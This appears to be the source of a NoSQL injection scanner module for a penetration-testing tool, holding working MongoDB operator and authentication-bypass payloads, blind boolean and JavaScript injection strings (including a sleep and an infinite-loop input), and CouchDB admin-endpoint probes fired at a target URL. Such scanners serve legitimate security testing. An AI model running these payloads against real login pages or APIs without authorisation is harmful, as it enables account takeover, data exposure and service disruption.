#!/usr/bin/python3
"""
NoSQL Scanner — MongoDB, CouchDB, and Redis injection testing for Catch403.

Tests authentication bypass, operator injection, JavaScript injection,
blind boolean-based NoSQL injection, and schema extraction.

Supports: MongoDB (most common), CouchDB, generic JSON APIs.

Usage:
  ../.venv/bin/python3 modules/nosql_scanner.py -u https://target.com/login -d '{"user":"test","pass":"test"}'
  ../.venv/bin/python3 modules/nosql_scanner.py -u https://target.com/api/users?id=1
  ../.venv/bin/python3 modules/nosql_scanner.py -u https://target.com/login --form-fields user,password
  ../.venv/bin/python3 modules/nosql_scanner.py -u https://target.com/login --cookie "session=abc"
  ../.venv/bin/python3 modules/nosql_scanner.py -u https://target.com -o results.json
"""
import argparse
import copy
import json
import re
import time
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run
from core.auth_gate import preflight

urllib3.disable_warnings()

UA = {"User-Agent": "Catch403/1.0"}
TIMEOUT = 10

# ── payload banks ──────────────────────────────────────────────────────────

# MongoDB operator injection — bypass WHERE-style comparisons
MONGO_OPERATOR_PAYLOADS = [
    {"$gt": ""},
    {"$gte": ""},
    {"$ne": None},
    {"$ne": "invalid_xyzzy"},
    {"$exists": True},
    {"$regex": ".*"},
    {"$in": ["admin", "root", "administrator"]},
    {"$where": "1==1"},
]

# Auth bypass via JSON body manipulation
AUTH_BYPASS_JSON = [
    # username field attacks
    {"user": {"$gt": ""}, "pass": {"$gt": ""}},
    {"user": {"$ne": None}, "pass": {"$ne": None}},
    {"user": "admin", "pass": {"$gt": ""}},
    {"user": {"$regex": "admin"}, "pass": {"$gt": ""}},
    # always-true conditions
    {"user": {"$where": "1==1"}, "pass": {"$where": "1==1"}},
]

# Form-based auth bypass (URL-encoded, brackets notation)
AUTH_BYPASS_FORM = [
    # user[$gt]=&pass[$gt]=
    ("[$gt]", ""),
    ("[$ne]", "invalid"),
    ("[$regex]", ".*"),
    ("[$exists]", "true"),
]

# Blind boolean payloads — compare true vs false conditions
BLIND_TRUE = [
    "a' || '1'=='1",
    "a' || 1==1 || 'x'=='y",
    "'; return true; var x='",
    '{"$where": "1==1"}',
]
BLIND_FALSE = [
    "a' || '1'=='2",
    "a' || 1==2 || 'x'=='y",
    "'; return false; var x='",
    '{"$where": "1==2"}',
]

# JavaScript injection
JS_PAYLOADS = [
    "'; return true; var a='",
    "'; sleep(5000); var x='",
    "1'; while(true){}//",
    "a';return this.password.match(/.*/)//",
]

# CouchDB-specific
COUCHDB_PAYLOADS = [
    '/_all_dbs',
    '/_utils',
    '/_config',
    '/_membership',
]


# ── detection helpers ──────────────────────────────────────────────────────

def _baseline(url: str, method: str, headers: dict, body: dict | None, params: dict | None) -> requests.Response:
    if method == "POST":
        return requests.post(url, json=body, headers=headers,
                             timeout=TIMEOUT, verify=False, allow_redirects=False)
    return requests.get(url, params=params, headers=headers,
                        timeout=TIMEOUT, verify=False, allow_redirects=False)


def _looks_like_success(resp: requests.Response, baseline_status: int, baseline_len: int) -> bool:
    # Auth bypass likely if: was 401/403 → now 200/302, OR body grew significantly
    if baseline_status in (401, 403) and resp.status_code in (200, 302):
        return True
    if resp.status_code == baseline_status:
        ratio = abs(len(resp.text) - baseline_len) / max(baseline_len, 1)
        return ratio > 0.3
    return False


def _is_json_endpoint(resp: requests.Response) -> bool:
    ct = resp.headers.get("Content-Type", "")
    return "json" in ct or resp.text.strip().startswith(("{", "["))


# ── test functions ─────────────────────────────────────────────────────────

def _test_auth_bypass_json(url: str, fields: list[str], headers: dict) -> list[dict]:
    """Try JSON operator injection on a login endpoint."""
    findings = []
    try:
        baseline = requests.post(url, json={f: "x" for f in fields},
                                 headers=headers, timeout=TIMEOUT, verify=False,
                                 allow_redirects=False)
    except requests.RequestException:
        return findings

    base_status = baseline.status_code
    base_len = len(baseline.text)

    for payload in AUTH_BYPASS_JSON:
        try:
            r = requests.post(url, json=payload, headers=headers,
                              timeout=TIMEOUT, verify=False, allow_redirects=False)
            if _looks_like_success(r, base_status, base_len):
                findings.append({
                    "name": "NoSQL Auth Bypass (JSON operator injection)",
                    "severity": "critical",
                    "detail": (
                        f"Status {base_status} → {r.status_code}. "
                        f"Payload: {json.dumps(payload)}"
                    ),
                    "payload": json.dumps(payload),
                    "url": url,
                })
                break
        except requests.RequestException:
            continue

    return findings


def _test_auth_bypass_form(url: str, fields: list[str], headers: dict) -> list[dict]:
    """Try bracket-notation operator injection in form fields."""
    findings = []
    try:
        baseline = requests.post(url, data={f: "x" for f in fields},
                                 headers=headers, timeout=TIMEOUT, verify=False,
                                 allow_redirects=False)
    except requests.RequestException:
        return findings

    base_status = baseline.status_code
    base_len = len(baseline.text)

    for suffix, value in AUTH_BYPASS_FORM:
        data = {}
        for field in fields:
            data[f"{field}{suffix}"] = value
        try:
            r = requests.post(url, data=data, headers=headers,
                              timeout=TIMEOUT, verify=False, allow_redirects=False)
            if _looks_like_success(r, base_status, base_len):
                findings.append({
                    "name": "NoSQL Auth Bypass (form bracket notation)",
                    "severity": "critical",
                    "detail": (
                        f"Status {base_status} → {r.status_code}. "
                        f"Field suffix: {suffix!r}"
                    ),
                    "payload": str(data),
                    "url": url,
                })
                break
        except requests.RequestException:
            continue

    return findings


def _test_param_injection(url: str, headers: dict) -> list[dict]:
    """Inject MongoDB operators into each URL query parameter."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    for param in params:
        original_val = params[param][0]
        try:
            baseline = requests.get(url, headers=headers,
                                    timeout=TIMEOUT, verify=False, allow_redirects=False)
            base_status = baseline.status_code
            base_len = len(baseline.text)
        except requests.RequestException:
            continue

        for op_payload in MONGO_OPERATOR_PAYLOADS:
            test_params = {p: v[0] for p, v in params.items()}
            test_params[param] = json.dumps(op_payload)
            try:
                r = requests.get(
                    urllib.parse.urlunparse(parsed._replace(query="")),
                    params=test_params,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False,
                )
                if _looks_like_success(r, base_status, base_len):
                    findings.append({
                        "name": f"NoSQL Operator Injection — parameter '{param}'",
                        "severity": "high",
                        "detail": (
                            f"Status {base_status} → {r.status_code}. "
                            f"Payload: {json.dumps(op_payload)}"
                        ),
                        "param": param,
                        "payload": json.dumps(op_payload),
                        "url": url,
                    })
                    break
            except requests.RequestException:
                continue

    return findings


def _test_blind_boolean(url: str, headers: dict, fields: list[str]) -> list[dict]:
    """Detect blind NoSQL injection by comparing true vs false condition responses."""
    findings = []
    method = "POST" if fields else "GET"

    def _req(payload_val: str) -> requests.Response | None:
        try:
            if method == "POST":
                return requests.post(url, data={f: payload_val for f in fields},
                                     headers=headers, timeout=TIMEOUT, verify=False,
                                     allow_redirects=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                return None
            p = {k: v[0] for k, v in params.items()}
            first_key = next(iter(p))
            p[first_key] = payload_val
            return requests.get(
                urllib.parse.urlunparse(parsed._replace(query="")),
                params=p, headers=headers, timeout=TIMEOUT, verify=False,
                allow_redirects=False,
            )
        except requests.RequestException:
            return None

    for true_p, false_p in zip(BLIND_TRUE, BLIND_FALSE):
        r_true = _req(true_p)
        r_false = _req(false_p)
        if r_true is None or r_false is None:
            continue
        if r_true.status_code != r_false.status_code or (
            abs(len(r_true.text) - len(r_false.text)) > 50
        ):
            findings.append({
                "name": "Blind NoSQL Boolean Injection",
                "severity": "high",
                "detail": (
                    f"True payload ({r_true.status_code}, {len(r_true.text)}B) ≠ "
                    f"False payload ({r_false.status_code}, {len(r_false.text)}B)"
                ),
                "true_payload": true_p,
                "false_payload": false_p,
                "url": url,
            })
            break

    return findings


def _test_couchdb(base_url: str, headers: dict) -> list[dict]:
    """Check for exposed CouchDB admin endpoints."""
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in COUCHDB_PATHS:
        url = root + path
        try:
            r = requests.get(url, headers=headers, timeout=TIMEOUT,
                             verify=False, allow_redirects=False)
            if r.status_code == 200 and _is_json_endpoint(r):
                findings.append({
                    "name": "Exposed CouchDB Endpoint",
                    "severity": "high",
                    "detail": f"Endpoint {url} returned 200 with JSON",
                    "url": url,
                })
        except requests.RequestException:
            continue

    return findings


COUCHDB_PATHS = COUCHDB_PAYLOADS  # alias


# ── orchestrator ───────────────────────────────────────────────────────────

def scan(
    url: str,
    *,
    data: str = "",
    form_fields: list[str] | None = None,
    cookie: str = "",
    check_couchdb: bool = True,
) -> list[dict]:
    """
    Run all NoSQL injection checks against url, return findings as list[dict].

    data: JSON body string for POST endpoints
    form_fields: field names to use for form-based auth bypass
    """
    findings: list[dict] = []
    headers = {**UA}
    if cookie:
        headers["Cookie"] = cookie

    fields = form_fields or []

    # Detect JSON body
    json_body = None
    if data:
        try:
            json_body = json.loads(data)
            if isinstance(json_body, dict):
                fields = fields or list(json_body.keys())
        except json.JSONDecodeError:
            pass

    if fields:
        findings += _test_auth_bypass_json(url, fields, headers)
        findings += _test_auth_bypass_form(url, fields, headers)
        findings += _test_blind_boolean(url, headers, fields)

    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        findings += _test_param_injection(url, headers)
        findings += _test_blind_boolean(url, headers, [])

    if check_couchdb:
        findings += _test_couchdb(url, headers)

    return findings


# ── CLI ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 NoSQL Injection Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-d", dest="data", default="",
                        help="JSON POST body, e.g. '{\"user\":\"test\",\"pass\":\"test\"}'")
    parser.add_argument("--form-fields", default="",
                        help="Comma-separated form field names for auth bypass tests")
    parser.add_argument("--cookie", default="")
    parser.add_argument("--no-couchdb", action="store_true", help="Skip CouchDB checks")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    preflight('nosql_scanner', args.url, active=True)

    parsed = urllib.parse.urlparse(args.url)
    print(f"{run} NoSQL injection scan against {bold}{parsed.netloc}{parsed.path}{end}")

    fields = [f.strip() for f in args.form_fields.split(",") if f.strip()]

    results = scan(
        args.url,
        data=args.data,
        form_fields=fields or None,
        cookie=args.cookie,
        check_couchdb=not args.no_couchdb,
    )

    for f in results:
        sev = f.get("severity", "info")
        prefix = bad if sev == "critical" else (
            f"{bold}[HIGH]{end}" if sev == "high" else info
        )
        print(f"{prefix} {bold}{f['name']}{end}")
        if f.get("detail"):
            print(f"        {f['detail']}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")

    print()
    crits = [f for f in results if f.get("severity") in ("critical", "high")]
    if crits:
        print(f"{good} {len(crits)} critical/high finding(s)")
    else:
        print(f"{info} No NoSQL injection found")


if __name__ == "__main__":
    main()
